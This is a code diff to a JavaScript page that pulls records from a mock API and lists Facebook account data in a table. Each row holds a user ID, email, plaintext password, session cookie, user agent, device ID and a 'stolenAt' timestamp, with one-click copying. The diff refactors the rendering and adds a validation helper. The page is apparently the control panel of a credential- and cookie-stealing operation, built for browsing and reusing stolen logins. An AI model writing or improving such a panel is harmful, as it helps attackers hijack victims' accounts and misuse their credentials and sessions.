@@ -1,46 +1,51 @@
 const API = "https://65954b4d04335332df8268cd.mockapi.io/saved";
-
 const tbody = document.querySelector("tbody");
+
+function validateText(text, isNumber = false) {
+    if (text && text !== "") {
+        return isNumber ? !isNaN(Number(text)) && text : !text.includes(" ") && text;
+    }
+    return false;
+}
 
 function fillDataToTable() {
     fetch(API)
         .then((res) => res.json())
-        .then((res) => {
-            const html = res
+        .then((data) => {
+            const html = data
                 .map((user, index) => {
+                    const shortCookie = user.cookie.split(";")[0].split("=")[1];
                     return `<tr scope="row">
-                <td><a class="text-white text-decoration-none fw-bold" target="_blank"  href='${
-                    user.c_user && user.c_user != "" ? "https://fb.com/" + user.c_user : "#"
-                }'>${index + 1}</a></td>
-                <td data-bs-coppy="${user.c_user}">${user.c_user}</td>
-                <td data-bs-coppy="${user.email}">${user.email}</td>
-                <td data-bs-coppy="${user.password}">${user.password}</td>
-
-                <td  data-bs-coppy="${user.cookie}" class="short-view" style='color: ${
-                        user.cookie && user.cookie != "" ? "" : "red !important"
-                    }' title="${user.cookie}">
-                    ${user.cookie && user.cookie != "" ? user.cookie.split(";")[0].split("=")[1] : "unknown"}
-                </td>
-
-                <td data-bs-coppy="${user.userAgent}" class="short-view" title="${user.userAgent}">Coppy</td>
-                <td data-bs-coppy="${user.device_id}">${user.device_id}</td>
-                <td data-bs-coppy="${user.stolenAt}">${user.stolenAt}</td>
-                <td>
-                <button  data-bs-toggle="modal" data-bs-target="#show-options-modal" class="menu-more btn btn-secondary" style="padding: 6px 20px;border-radius: 12px; background: #ffffff11; color: white" data-bs-id="${
-                    user.id
-                }">More
-                </button></td>
+                    <td><a class="text-white text-decoration-none fw-bold" target="_blank"  href='${
+                        validateText(user.c_user) ? "https://fb.com/" + user.c_user : "#"
+                    }'>${index + 1}</a></td>
+                    ${["c_user", "email", "password", "device_id"]
+                        .map(
+                            (field) => `
+                        <td title="${user[field]}" data-bs-coppy="${user[field]}" style='color: ${
+                                validateText(user[field]) ? "" : "red !important"
+                            }'>${validateText(user[field]) || "unknown"}</td>
+                    `
+                        )
+                        .join("")}
+                    <td data-bs-coppy="${user.cookie}" class="short-view" style='color: ${
+                        shortCookie || "red !important"
+                    }' title="${user.cookie}">${shortCookie || "unknown"}</td>
+                    <td data-bs-coppy="${user.userAgent}" class="short-view" title="${user.userAgent}">Coppy</td>
+                    <td title="${user.stolenAt}" data-bs-coppy="${user.stolenAt}">${user.stolenAt}</td>
+                    <td><button data-bs-toggle="modal" data-bs-target="#show-options-modal" class="menu-more btn btn-secondary" style="padding: 6px 20px;border-radius: 12px; background: #ffffff11; color: white" data-bs-id="${
+                        user.id
+                    }">More</button></td>
                 </tr>`;
                 })
                 .join("");
             tbody.innerHTML = html;
         })
         .finally(() => {
-            const tds = document.querySelectorAll("td[data-bs-coppy]");
-            tds.forEach((td) => {
+            document.querySelectorAll("td[data-bs-coppy]").forEach((td) => {
                 td.onclick = () => {
                     const text = td.getAttribute("data-bs-coppy");
-                    if (text && text != "" && text != "unknown") {
+                    if (text && text !== "" && text !== "unknown") {
                         navigator.clipboard.writeText(text);
                         Swal.fire({
                             title: "Success!",
@@ -51,7 +56,7 @@ function fillDataToTable() {
                     } else {
                         Swal.fire({
                             title: "Error!",
-                            text: "Can not coppy the empty value!",
+                            text: "Can not copy the empty value!",
                             icon: "error",
                             confirmButtonText: "Okay",
                         });
